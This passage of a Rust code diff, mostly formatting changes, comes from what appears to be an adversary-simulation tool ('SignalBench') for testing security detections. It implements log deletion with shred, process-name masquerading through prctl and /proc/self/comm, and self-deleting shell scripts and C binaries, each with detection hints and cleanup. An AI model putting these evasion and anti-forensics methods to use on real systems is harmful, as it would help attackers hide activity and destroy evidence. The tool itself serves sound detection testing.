                 fs::create_dir_all(&fake_log_dir)
                     .map_err(|e| format!("Failed to create fake log directory: {e}"))?;
-                
+
                 // Create fake log files
                 let log_files = vec!["auth.log", "syslog", "secure.log", "access.log"];
-                
+
                 for log_name in &log_files {
                     let log_path = format!("{fake_log_dir}/{log_name}");
                     let fake_content = "Nov  5 12:34:56 testhost systemd[1]: Started session.\n\
@@ -1764,19 +1964,22 @@ impl AttackTechnique for FileDeletion {
                          Nov  5 12:35:02 testhost sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash\n\
                          Nov  5 12:35:03 testhost EVIDENCE_OF_ATTACK: Suspicious activity detected\n\
                          Nov  5 12:35:04 testhost systemd[1]: Session closed.\n".to_string();
-                    
+
                     fs::write(&log_path, fake_content.as_bytes())
                         .map_err(|e| format!("Failed to create fake log: {e}"))?;
-                    
+
                     writeln!(log, "Created fake log: {log_name}").unwrap();
                 }
-                
-                info!("Created {} fake log files, now deleting them to simulate tampering...", log_files.len());
-                
+
+                info!(
+                    "Created {} fake log files, now deleting them to simulate tampering...",
+                    log_files.len()
+                );
+
                 // Delete the fake logs to simulate tampering
                 for log_name in &log_files {
                     let log_path = format!("{fake_log_dir}/{log_name}");
-                    
+
                     if shred_available && use_shred {
                         Command::new("shred")
                             .args(["-uvz", "-n", "3", &log_path])
@@ -1789,27 +1992,42 @@ impl AttackTechnique for FileDeletion {
                         writeln!(log, "Deleted fake log: {log_name}").unwrap();
                     }
                 }
-                
+
                 info!("Log tampering simulation complete");
-                writeln!(log, "Log tampering simulation complete - {} fake logs created and deleted", log_files.len()).unwrap();
+                writeln!(
+                    log,
+                    "Log tampering simulation complete - {} fake logs created and deleted",
+                    log_files.len()
+                )
+                .unwrap();
                 writeln!(log).unwrap();
             }
-            
+
             // Summary
-            let successful_deletions = deletion_results.iter().filter(|(_, _, success)| *success).count();
-            
+            let successful_deletions = deletion_results
+                .iter()
+                .filter(|(_, _, success)| *success)
+                .count();
+
             writeln!(log, "=== Summary ===").unwrap();
             writeln!(log, "Files created: {}", created_files.len()).unwrap();
             writeln!(log, "Files backed up: {}", created_files.len()).unwrap();
             writeln!(log, "Deletion attempts: {}", deletion_results.len()).unwrap();
             writeln!(log, "Successful deletions: {successful_deletions}").unwrap();
-            writeln!(log, "Methods used: shred ({}), rm (true), wipe ({})", 
-                shred_available && use_shred, 
-                wipe_available).unwrap();
-            
-            info!("File deletion demonstration complete: {}/{} successful deletions", 
-                successful_deletions, deletion_results.len());
-            
+            writeln!(
+                log,
+                "Methods used: shred ({}), rm (true), wipe ({})",
+                shred_available && use_shred,
+                wipe_available
+            )
+            .unwrap();
+
+            info!(
+                "File deletion demonstration complete: {}/{} successful deletions",
+                successful_deletions,
+                deletion_results.len()
+            );
+
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: true,
@@ -1828,20 +2046,20 @@ impl AttackTechnique for FileDeletion {
     fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
         Box::pin(async move {
             info!("Starting file deletion technique cleanup...");
-            
+
             // Restore backed up files before cleanup (demonstration of reversibility)
             let backup_dir = artifacts.iter().find(|a| a.contains("backup"));
             let test_dir = artifacts.iter().find(|a| a.contains("deletion_test"));
-            
+
             if let (Some(backup), Some(test)) = (backup_dir, test_dir) {
                 if Path::new(backup).exists() && Path::new(test).exists() {
                     info!("Restoring backed up files from {backup} to {test}");
-                    
+
                     if let Ok(entries) = fs::read_dir(backup) {
                         for entry in entries.flatten() {
                             let file_name = entry.file_name();
                             let dest_path = format!("{}/{}", test, file_name.to_string_lossy());
-                            
+
                             if fs::copy(entry.path(), &dest_path).is_ok() {
                                 info!("Restored: {}", file_name.to_string_lossy());
                             }
@@ -1849,7 +2067,7 @@ impl AttackTechnique for FileDeletion {
                     }
                 }
             }
-            
+
             // Remove all artifacts
             for artifact in artifacts {
                 if Path::new(artifact).exists() {
@@ -1866,7 +2084,7 @@ impl AttackTechnique for FileDeletion {
                     }
                 }
             }
-            
+
             info!("File deletion technique cleanup complete");
             Ok(())
         })
@@ -1879,8 +2097,8 @@ impl AttackTechnique for FileDeletion {
 // Uses prctl(PR_SET_NAME) to change process name at runtime, mimicking
 // system processes to evade detection. Based on ttp-bench patterns.
 
-use tokio::process::Command;
 use log::debug;
+use tokio::process::Command;
 
 pub struct ProcessMasquerading {}
 
@@ -1893,7 +2111,8 @@ impl AttackTechnique for ProcessMasquerading {
             description: "Changes process name at runtime using prctl(PR_SET_NAME) to mimic \
                 legitimate system processes like [kworker], [migration], sshd, or systemd. \
                 Creates a child process that renames itself and performs suspicious activity \
-                while appearing as a system process. Based on ttp-bench masquerading patterns.".to_string(),
+                while appearing as a system process. Based on ttp-bench masquerading patterns."
+                .to_string(),
             category: "defense_evasion".to_string(),
             parameters: vec![
                 TechniqueParameter {
@@ -1911,7 +2130,8 @@ impl AttackTechnique for ProcessMasquerading {
             ],
             detection: "Monitor for: prctl syscalls with PR_SET_NAME, process name changes \
                 via /proc/self/comm, mismatched process names vs executable paths, kernel \
-                thread names from userspace processes, comm field changes in process accounting.".to_string(),
+                thread names from userspace processes, comm field changes in process accounting."
+                .to_string(),
             cleanup_support: true,
             platforms: vec!["Linux".to_string()],
             permissions: vec!["user".to_string()],
@@ -1919,27 +2139,23 @@ impl AttackTechnique for ProcessMasquerading {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         Box::pin(async move {
             let log_file = config
                 .parameters
                 .get("log_file")
                 .cloned()
                 .unwrap_or_else(|| "/tmp/signalbench_masquerade.log".to_string());
-            
+
             let target_name = config
                 .parameters
                 .get("target_name")
                 .cloned()
                 .unwrap_or_else(|| "[kworker/0:1]".to_string());
-            
+
             debug!("[T1036-PROC] Starting Process Masquerading technique");
             debug!("[T1036-PROC] Target name: {}", target_name);
-            
+
             // List of suspicious process names to masquerade as
             let masquerade_targets = vec![
                 "[kworker/0:1]",
@@ -1953,11 +2169,14 @@ impl AttackTechnique for ProcessMasquerading {
                 "crond",
                 "atd",
             ];
-            
+
             if dry_run {
                 info!("[DRY RUN] Would perform process name masquerading:");
                 info!("[DRY RUN] - Primary target: {}", target_name);
-                info!("[DRY RUN] - Would masquerade as {} different process names", masquerade_targets.len());
+                info!(
+                    "[DRY RUN] - Would masquerade as {} different process names",
+                    masquerade_targets.len()
+                );
                 for name in &masquerade_targets {
                     info!("[DRY RUN] - Would rename process to: {}", name);
                 }
@@ -1969,85 +2188,94 @@ impl AttackTechnique for ProcessMasquerading {
                     cleanup_required: false,
                 });
             }
-            
-            let mut log = File::create(&log_file)
-                .map_err(|e| format!("Failed to create log file: {}", e))?;
-            
+
+            let mut log =
+                File::create(&log_file).map_err(|e| format!("Failed to create log file: {}", e))?;
+
             writeln!(log, "# SignalBench Process Masquerading").unwrap();
             writeln!(log, "# MITRE ATT&CK Technique: T1036 - Masquerading").unwrap();
             writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
-            writeln!(log, "# --------------------------------------------------------\n").unwrap();
-            
+            writeln!(
+                log,
+                "# --------------------------------------------------------\n"
+            )
+            .unwrap();
+
             // Get current process info
             let pid = std::process::id();
             let original_comm = fs::read_to_string("/proc/self/comm")
                 .unwrap_or_else(|_| "unknown".to_string())
                 .trim()
                 .to_string();
-            
+
             writeln!(log, "Original process name: {}", original_comm).unwrap();
             writeln!(log, "PID: {}", pid).unwrap();
             writeln!(log).unwrap();
-            
+
             info!("[T1036-PROC] Original process name: {}", original_comm);
-            
+
             // Method 1: Direct prctl via libc
             writeln!(log, "=== Method 1: prctl(PR_SET_NAME) ===").unwrap();
-            
+
             let truncated_name = if target_name.len() > 15 {
                 &target_name[..15]
             } else {
                 &target_name
             };
-            
+
             let c_name = std::ffi::CString::new(truncated_name)
                 .map_err(|e| format!("Invalid process name: {}", e))?;
-            
-            let result = unsafe {
-                libc::prctl(libc::PR_SET_NAME, c_name.as_ptr())
-            };
-            
+
+            let result = unsafe { libc::prctl(libc::PR_SET_NAME, c_name.as_ptr()) };
+
             if result == 0 {
                 let new_comm = fs::read_to_string("/proc/self/comm")
                     .unwrap_or_else(|_| "unknown".to_string())
                     .trim()
                     .to_string();
-                
+
                 writeln!(log, "prctl(PR_SET_NAME, '{}') - SUCCESS", truncated_name).unwrap();
                 writeln!(log, "New /proc/self/comm: {}", new_comm).unwrap();
                 info!("[T1036-PROC] Process renamed to: {}", new_comm);
             } else {
                 writeln!(log, "prctl(PR_SET_NAME) - FAILED").unwrap();
             }
-            
+
             // Method 2: Write to /proc/self/comm
             writeln!(log, "\n=== Method 2: Write to /proc/self/comm ===").unwrap();
-            
+
             for name in &masquerade_targets[..3] {
                 debug!("[T1036-PROC] Attempting to rename to: {}", name);
-                
+
                 let truncated = if name.len() > 15 { &name[..15] } else { name };
-                
+
                 match fs::write("/proc/self/comm", truncated) {
                     Ok(_) => {
-                        writeln!(log, "Write '{}' to /proc/self/comm - SUCCESS", truncated).unwrap();
-                        
+                        writeln!(log, "Write '{}' to /proc/self/comm - SUCCESS", truncated)
+                            .unwrap();
+
                         // Read back to verify
                         if let Ok(current) = fs::read_to_string("/proc/self/comm") {
                             writeln!(log, "Verified: {}", current.trim()).unwrap();
                         }
                     }
                     Err(e) => {
-                        writeln!(log, "Write '{}' to /proc/self/comm - FAILED: {}", name, e).unwrap();
+                        writeln!(log, "Write '{}' to /proc/self/comm - FAILED: {}", name, e)
+                            .unwrap();
                     }
                 }
             }
-            
+
             // Method 3: Spawn multiple child processes with masqueraded names (extended runtime)
-            writeln!(log, "\n=== Method 3: Spawn masqueraded child processes (extended runtime) ===").unwrap();
-            
+            writeln!(
+                log,
+                "\n=== Method 3: Spawn masqueraded child processes (extended runtime) ==="
+            )
+            .unwrap();
+
             // Create a script that renames itself, spawns children, and runs longer
-            let script_content = format!(r#"#!/bin/bash
+            let script_content = format!(
+                r#"#!/bin/bash
 # SignalBench masquerading child process - extended runtime
 echo $$ > /tmp/signalbench_masq_child.pid
 echo '{}' > /proc/self/comm
@@ -2066,24 +2294,23 @@ sleep 5
 # Cleanup
 rm -f /tmp/signalbench_masq_child.pid
 wait
-"#, truncated_name);
-            
+"#,
+                truncated_name
+            );
+
             let script_path = "/tmp/signalbench_masq_child.sh";
             fs::write(script_path, &script_content)
                 .map_err(|e| format!("Failed to create child script: {}", e))?;
-            
+
             let _ = Command::new("chmod")
                 .args(["+x", script_path])
                 .output()
                 .await;
-            
+
             // Start the masqueraded process chain
             info!("[T1036-PROC] Spawning masqueraded child processes with extended runtime...");
-            let child_result = Command::new("bash")
-                .args([script_path])
-                .output()
-                .await;
-            
+            let child_result = Command::new("bash").args([script_path]).output().await;
+
             match child_result {
                 Ok(_) => {
                     writeln!(log, "Spawned masqueraded child process chain - SUCCESS").unwrap();
@@ -2093,32 +2320,35 @@ wait
                     writeln!(log, "Spawn child - FAILED: {}", e).unwrap();
                 }
             }
-            
+
             // Clean up script
             let _ = fs::remove_file(script_path);
-            
+
             // Restore original name
             writeln!(log, "\n=== Restoring original process name ===").unwrap();
-            
+
             let orig_cname = std::ffi::CString::new(original_comm.as_str())
                 .unwrap_or_else(|_| std::ffi::CString::new("signalbench").unwrap());
-            
+
             unsafe {
                 libc::prctl(libc::PR_SET_NAME, orig_cname.as_ptr());
             }
-            
+
             let final_comm = fs::read_to_string("/proc/self/comm")
                 .unwrap_or_else(|_| "unknown".to_string())
                 .trim()
                 .to_string();
-            
+
             writeln!(log, "Restored to: {}", final_comm).unwrap();
             info!("[T1036-PROC] Process name restored to: {}", final_comm);
-            
+
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: true,
-                message: format!("Successfully masqueraded process as '{}' and restored to original", target_name),
+                message: format!(
+                    "Successfully masqueraded process as '{}' and restored to original",
+                    target_name
+                ),
                 artifacts: vec![log_file],
                 cleanup_required: true,
             })
@@ -2128,17 +2358,17 @@ wait
     fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
         Box::pin(async move {
             debug!("[T1036-PROC] Starting cleanup");
-            
+
             // Remove any leftover files
             let _ = fs::remove_file("/tmp/signalbench_masq_child.pid");
             let _ = fs::remove_file("/tmp/signalbench_masq_child.sh");
-            
+
             for artifact in artifacts {
                 if Path::new(artifact).exists() {
                     let _ = fs::remove_file(artifact);
                 }
             }
-            
+
             info!("[T1036-PROC] Cleanup complete");
             Ok(())
         })
@@ -2163,7 +2393,8 @@ impl AttackTechnique for SelfDeletingBinary {
                 running process unlinks its own executable from disk, leaving only the \
                 in-memory image. This is a common malware technique to evade forensic \
                 analysis. Creates a copy of a test binary, executes it, and has it delete \
-                itself whilst running. Based on ttp-bench patterns.".to_string(),
+                itself whilst running. Based on ttp-bench patterns."
+                .to_string(),
             category: "defense_evasion".to_string(),
             parameters: vec![
                 TechniqueParameter {
@@ -2182,7 +2413,8 @@ impl AttackTechnique for SelfDeletingBinary {
             detection: "Monitor for: unlink syscalls on /proc/self/exe paths, processes \
                 with deleted executable indicators, '[deleted]' suffix in /proc/*/exe links, \
                 file deletions immediately after execution, missing executable files for \
-                running processes.".to_string(),
+                running processes."
+                .to_string(),
             cleanup_support: true,
             platforms: vec!["Linux".to_string()],
             permissions: vec!["user".to_string()],
@@ -2190,27 +2422,23 @@ impl AttackTechnique for SelfDeletingBinary {
         }
     }
 
-    fn execute<'a>(
-        &'a self,
-        config: &'a TechniqueConfig,
-        dry_run: bool,
-    ) -> ExecuteFuture<'a> {
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
         Box::pin(async move {
             let log_file = config
                 .parameters
                 .get("log_file")
                 .cloned()
                 .unwrap_or_else(|| "/tmp/signalbench_self_delete.log".to_string());
-            
+
             let work_dir = config
                 .parameters
                 .get("work_dir")
                 .cloned()
                 .unwrap_or_else(|| "/tmp/signalbench_self_delete".to_string());
-            
+
             debug!("[T1070.004-SELF] Starting Self-Deleting Binary technique");
             debug!("[T1070.004-SELF] Work directory: {}", work_dir);
-            
+
             if dry_run {
                 info!("[DRY RUN] Would demonstrate self-deleting binary pattern:");
                 info!("[DRY RUN] - Create work directory: {}", work_dir);
@@ -2224,26 +2452,35 @@ impl AttackTechnique for SelfDeletingBinary {
                     cleanup_required: false,
                 });
             }
-            
+
             // Create work directory
             fs::create_dir_all(&work_dir)
                 .map_err(|e| format!("Failed to create work directory: {}", e))?;
-            
-            let mut log = File::create(&log_file)
-                .map_err(|e| format!("Failed to create log file: {}", e))?;
-            
+
+            let mut log =
+                File::create(&log_file).map_err(|e| format!("Failed to create log file: {}", e))?;
+
             writeln!(log, "# SignalBench Self-Deleting Binary Pattern").unwrap();
-            writeln!(log, "# MITRE ATT&CK Technique: T1070.004 - Indicator Removal: File Deletion").unwrap();
+            writeln!(
+                log,
+                "# MITRE ATT&CK Technique: T1070.004 - Indicator Removal: File Deletion"
+            )
+            .unwrap();
             writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
-            writeln!(log, "# --------------------------------------------------------\n").unwrap();
-            
+            writeln!(
+                log,
+                "# --------------------------------------------------------\n"
+            )
+            .unwrap();
+
             // Method 1: Shell script that deletes itself
             writeln!(log, "=== Method 1: Self-deleting shell script ===").unwrap();
-            
+
             let script_path = format!("{}/signalbench_self_delete_test.sh", work_dir);
             let marker_path = format!("{}/self_delete_marker.txt", work_dir);
-            
-            let script_content = format!(r#"#!/bin/bash
+
+            let script_content = format!(
+                r#"#!/bin/bash
 # SignalBench self-deleting script demonstration
 SCRIPT_PATH="$0"
 MARKER="{}"
@@ -2283,35 +2520,34 @@ readlink -f /proc/$$/exe >> "$MARKER" 2>&1
 sleep 3
 
 echo "Script completed while deleted from disk" >> "$MARKER"
-"#, marker_path);
-            
+"#,
+                marker_path
+            );
+
             fs::write(&script_path, &script_content)
                 .map_err(|e| format!("Failed to create test script: {}", e))?;
-            
+
             let _ = Command::new("chmod")
                 .args(["+x", &script_path])
                 .output()
                 .await;
-            
+
             writeln!(log, "Created self-deleting script: {}", script_path).unwrap();
             info!("[T1070.004-SELF] Created test script: {}", script_path);
-            
+
             // Execute the script
-            let exec_result = Command::new("bash")
-                .args([&script_path])
-                .output()
-                .await;
-            
+            let exec_result = Command::new("bash").args([&script_path]).output().await;
+
             match exec_result {
                 Ok(output) => {
                     writeln!(log, "Execution completed with status: {}", output.status).unwrap();
-                    
+
                     // Check if script deleted itself
                     if !Path::new(&script_path).exists() {
                         writeln!(log, "Script successfully deleted itself while running").unwrap();
                         info!("[T1070.004-SELF] Script deleted itself successfully");
                     }
-                    
+
                     // Read the marker file for details
                     if let Ok(marker_content) = fs::read_to_string(&marker_path) {
                         writeln!(log, "\nMarker file contents:").unwrap();
@@ -2322,30 +2558,31 @@ echo "Script completed while deleted from disk" >> "$MARKER"
                     writeln!(log, "Execution failed: {}", e).unwrap();
                 }
             }
-            
+
             // Method 2: Demonstrate /proc/self/exe checking
             writeln!(log, "\n=== Method 2: Check current process exe status ===").unwrap();
-            
+
             let our_exe = fs::read_link("/proc/self/exe")
                 .map(|p| p.to_string_lossy().to_string())
                 .unwrap_or_else(|_| "unknown".to_string());
-            
+
             writeln!(log, "Current process /proc/self/exe: {}", our_exe).unwrap();
-            
+
             if our_exe.contains("(deleted)") {
                 writeln!(log, "[DETECTED] Current binary shows as deleted!").unwrap();
             } else {
                 writeln!(log, "Current binary exists on disk").unwrap();
             }
-            
+
             // Method 3: Create and run a C program that deletes itself
             writeln!(log, "\n=== Method 3: Compiled binary self-deletion ===").unwrap();
-            
+
             let c_source = format!("{}/signalbench_self_delete.c", work_dir);
             let c_binary = format!("{}/signalbench_self_delete_bin", work_dir);
             let c_marker = format!("{}/c_binary_marker.txt", work_dir);
-            
-            let c_code = format!(r#"#include <stdio.h>
+
+            let c_code = format!(
+                r#"#include <stdio.h>
 #include <unistd.h>
 #include <string.h>
 #include <stdlib.h>
@@ -2385,31 +2622,33 @@ int main(int argc, char *argv[]) {{
     fclose(marker);
     return 0;
 }}
-"#, c_marker);
-            
+"#,
+                c_marker
+            );
+
             fs::write(&c_source, &c_code)
                 .map_err(|e| format!("Failed to create C source: {}", e))?;
-            
+
             // Try to compile
             let compile_result = Command::new("gcc")
                 .args(["-o", &c_binary, &c_source])
                 .output()
                 .await;
-            
+
             match compile_result {
                 Ok(output) if output.status.success() => {
                     writeln!(log, "Compiled self-deleting binary: {}", c_binary).unwrap();
-                    
+
                     // Execute the binary
                     let exec_result = Command::new(&c_binary).output().await;
-                    
+
                     match exec_result {
                         Ok(_) => {
                             if !Path::new(&c_binary).exists() {
                                 writeln!(log, "Binary successfully deleted itself").unwrap();
                                 info!("[T1070.004-SELF] Compiled binary deleted itself");
                             }
-                            
+
                             if let Ok(marker_content) = fs::read_to_string(&c_marker) {
                                 writeln!(log, "\nC binary marker contents:").unwrap();
                                 writeln!(log, "{}", marker_content).unwrap();
@@ -2429,12 +2668,16 @@ int main(int argc, char *argv[]) {{
                     writeln!(log, "Compilation error: {}", e).unwrap();
                 }
             }
-            
+
             writeln!(log, "\n=== Summary ===").unwrap();
-            writeln!(log, "Self-deleting binary pattern demonstrated successfully").unwrap();
-            
+            writeln!(
+                log,
+                "Self-deleting binary pattern demonstrated successfully"
+            )
+            .unwrap();
+
             info!("[T1070.004-SELF] Technique complete");
-            
+
             Ok(SimulationResult {
                 technique_id: self.info().id,
                 success: true,
@@ -2448,13 +2691,16 @@ int main(int argc, char *argv[]) {{
     fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
         Box::pin(async move {
             debug!("[T1070.004-SELF] Starting cleanup");
-            
+
             for artifact in artifacts {
                 let path = Path::new(artifact);
-                
+
                 if path.is_dir() {
                     if let Err(e) = fs::remove_dir_all(path) {
-                        warn!("[T1070.004-SELF] Failed to remove directory {}: {}", artifact, e);
+                        warn!(
+                            "[T1070.004-SELF] Failed to remove directory {}: {}",
+                            artifact, e
+                        );
                     }
                 } else if path.is_file() {
                     if let Err(e) = fs::remove_file(path) {
@@ -2462,7 +2708,7 @@ int main(int argc, char *argv[]) {{
                     }
                 }
             }
-            
+
             info!("[T1070.004-SELF] Cleanup complete");
             Ok(())
         })
